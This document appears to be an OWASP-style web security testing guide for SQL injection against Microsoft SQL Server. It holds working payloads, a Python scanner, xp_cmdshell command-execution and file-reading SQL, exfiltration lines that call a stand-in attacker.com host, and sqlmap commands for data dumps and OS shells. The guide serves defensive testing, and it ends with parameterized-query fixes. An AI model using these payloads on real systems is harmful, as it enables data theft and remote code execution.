# WSTG-INPV-05.3: Testing for SQL Injection - SQL Server

## Test ID
WSTG-INPV-05.3

## Test Name
Testing for SQL Injection - SQL Server (MSSQL)

## High-Level Description

Microsoft SQL Server-specific SQL injection testing leverages MSSQL's unique features including xp_cmdshell for OS command execution, OPENROWSET for data exfiltration, and specific error messages. MSSQL often runs with elevated privileges, making successful exploitation particularly dangerous.

---

## What to Check

- [ ] MSSQL error messages
- [ ] xp_cmdshell availability
- [ ] Stacked queries support
- [ ] OPENROWSET data exfiltration
- [ ] System table access
- [ ] Linked servers

---

## How to Test

### Step 1: MSSQL Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

echo "[*] Testing for Microsoft SQL Server..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "SQL Server|ODBC|mssql|Incorrect syntax"

# MSSQL comment syntax
curl -s "${TARGET}1--"
curl -s "${TARGET}1/*comment*/"

# Version detection
curl -s "${TARGET}1' AND 1=1 UNION SELECT @@version--"

# WAITFOR DELAY time-based
curl -s "${TARGET}1'; WAITFOR DELAY '0:0:5'--" --max-time 10
```

### Step 2: MSSQL SQLi Tester

```python
#!/usr/bin/env python3
"""
Microsoft SQL Server SQL Injection Tester
"""

import requests
import re
import time

class MSSQLSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # MSSQL error patterns
    MSSQL_ERRORS = [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQL Server.*Driver",
        r"Warning.*mssql_",
        r"SQL Server.*[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.SqlException",
        r"Exception.*\WSystem\.Data\.SqlClient\.",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"The conversion of a .* data type to a .* data type resulted",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"macromedia\.jdbc\.sqlserver",
        r"com\.jnetdirect\.jsql",
    ]

    # MSSQL-specific payloads
    MSSQL_PAYLOADS = {
        'error_based': [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=(SELECT TOP 1 CAST(@@version AS int))--",
            "' AND 1=db_name()--",
            "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,DB_NAME(),3--",
            "' UNION SELECT 1,SYSTEM_USER,3--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1 AND SUBSTRING(@@version,1,1)='M'", "1 AND SUBSTRING(@@version,1,1)='X'"),
        ],
        'time_based': [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "' IF 1=1 WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3)>0--",
        ],
        'stacked': [
            "'; SELECT @@version--",
            "'; EXEC master..xp_cmdshell 'whoami'--",
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
        ],
        'xp_cmdshell': [
            "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
            "'; EXEC xp_cmdshell 'whoami'--",
        ],
    }

    def detect_mssql(self, param):
        """Detect if backend is MSSQL"""
        print(f"[*] Detecting Microsoft SQL Server...")

        detection_payloads = [
            "' AND 1=1--",
            "' UNION SELECT @@version--",
            "'; SELECT 1--",
        ]

        for payload in detection_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                for pattern in self.MSSQL_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] Microsoft SQL Server detected!")
                        return True

                if 'microsoft' in response.text.lower() and 'sql' in response.text.lower():
                    print(f"[+] MSSQL likely detected!")
                    return True

            except Exception as e:
                pass

        return False

    def test_error_based(self, param):
        """Test MSSQL error-based injection"""
        print(f"\n[*] Testing MSSQL error-based injection...")

        for payload in self.MSSQL_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Look for version info in error
                if re.search(r'Microsoft SQL Server \d+', response.text, re.IGNORECASE):
                    print(f"[VULN] Error-based SQLi!")
                    version = re.search(r'Microsoft SQL Server \d+[^\r\n]*', response.text)
                    if version:
                        print(f"  Version: {version.group()}")
                    self.findings.append({
                        'type': 'MSSQL Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param):
        """Test MSSQL time-based blind injection"""
        print(f"\n[*] Testing MSSQL time-based injection (WAITFOR DELAY)...")

        # Baseline
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.MSSQL_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 4:
                    print(f"[VULN] Time-based SQLi (WAITFOR DELAY)!")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'MSSQL Time-based Blind SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'MSSQL Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_stacked_queries(self, param):
        """Test MSSQL stacked queries"""
        print(f"\n[*] Testing MSSQL stacked queries...")

        # Time-based test for stacked queries
        payload = "'; WAITFOR DELAY '0:0:5'--"

        try:
            start = time.time()
            self.session.get(self.url, params={param: payload}, timeout=30)
            response_time = time.time() - start

            if response_time > 4:
                print(f"[VULN] Stacked queries supported!")
                self.findings.append({
                    'type': 'MSSQL Stacked Queries',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True

        except requests.exceptions.Timeout:
            print(f"[VULN] Stacked queries supported (timeout)!")
            self.findings.append({
                'type': 'MSSQL Stacked Queries',
                'severity': 'Critical'
            })
            return True
        except Exception as e:
            pass

        return False

    def test_xp_cmdshell(self, param):
        """Test for xp_cmdshell execution"""
        print(f"\n[*] Testing xp_cmdshell (requires SA privileges)...")

        # DNS exfiltration via xp_cmdshell
        payload = "'; EXEC master..xp_cmdshell 'nslookup test.attacker.com'--"

        try:
            response = self.session.get(self.url, params={param: payload})

            if 'xp_cmdshell' not in response.text.lower():
                print(f"  [INFO] xp_cmdshell payload sent - check DNS logs")
                self.findings.append({
                    'type': 'MSSQL xp_cmdshell Test',
                    'payload': payload,
                    'severity': 'Critical',
                    'note': 'Check DNS logs for callback'
                })

        except Exception as e:
            pass

        return False

    def run_tests(self, param='id'):
        """Run all MSSQL SQLi tests"""
        if self.detect_mssql(param):
            self.test_error_based(param)
            self.test_time_based(param)
            self.test_stacked_queries(param)
            self.test_xp_cmdshell(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("MSSQL SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo MSSQL SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:70]}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")

# Usage
tester = MSSQLSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: MSSQL Data Extraction

```sql
-- MSSQL Version
SELECT @@version
SELECT SERVERPROPERTY('productversion')

-- Current User
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT CURRENT_USER

-- Current Database
SELECT DB_NAME()

-- List Databases
SELECT name FROM master..sysdatabases
SELECT name FROM sys.databases

-- List Tables
SELECT name FROM sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables

-- List Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- Extract Data
SELECT username + ':' + password FROM users

-- xp_cmdshell (Command Execution)
EXEC master..xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'net user'

-- Enable xp_cmdshell if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Read Files
CREATE TABLE #tmp (content NVARCHAR(4000));
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM #tmp;

-- DNS Exfiltration
EXEC master..xp_dirtree '\\attacker.com\share'
EXEC master..xp_fileexist '\\attacker.com\share'

-- Linked Servers
SELECT * FROM sys.servers
EXEC ('SELECT @@version') AT [LinkedServer]
```

### Step 4: SQLMap MSSQL Commands

```bash
# Basic MSSQL detection
sqlmap -u "https://target.com/product?id=1" --dbms=mssql

# Get MSSQL version
sqlmap -u "https://target.com/product?id=1" --dbms=mssql --banner

# List databases
sqlmap -u "https://target.com/product?id=1" --dbms=mssql --dbs

# List tables
sqlmap -u "https://target.com/product?id=1" --dbms=mssql -D master --tables

# Dump data
sqlmap -u "https://target.com/product?id=1" --dbms=mssql -D target_db -T users --dump

# OS shell via xp_cmdshell
sqlmap -u "https://target.com/product?id=1" --dbms=mssql --os-shell

# SQL shell
sqlmap -u "https://target.com/product?id=1" --dbms=mssql --sql-shell

# Privilege escalation
sqlmap -u "https://target.com/product?id=1" --dbms=mssql --priv-esc
```

---

## Tools

| Tool | Purpose |
|------|---------|
| SQLMap | Automated MSSQL SQLi |
| SQL Server Management Studio | Database client |
| Burp Suite | Manual testing |
| PowerUpSQL | MSSQL audit tool |

---

## Remediation

```csharp
// C# - Parameterized queries
string query = "SELECT * FROM users WHERE id = @id";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@id", userId);
SqlDataReader reader = cmd.ExecuteReader();
```

```python
# Python - pyodbc
cursor.execute("SELECT * FROM users WHERE id = ?", user_id)
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| MSSQL SQLi with xp_cmdshell | 10.0 | Critical |
| MSSQL SQLi with SA privileges | 9.8 | Critical |
| MSSQL SQLi data extraction | 8.6 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] MSSQL database detected
[ ] Error-based injection tested
[ ] Time-based injection tested
[ ] Stacked queries tested
[ ] xp_cmdshell tested
[ ] Privilege level determined
[ ] Findings documented
```
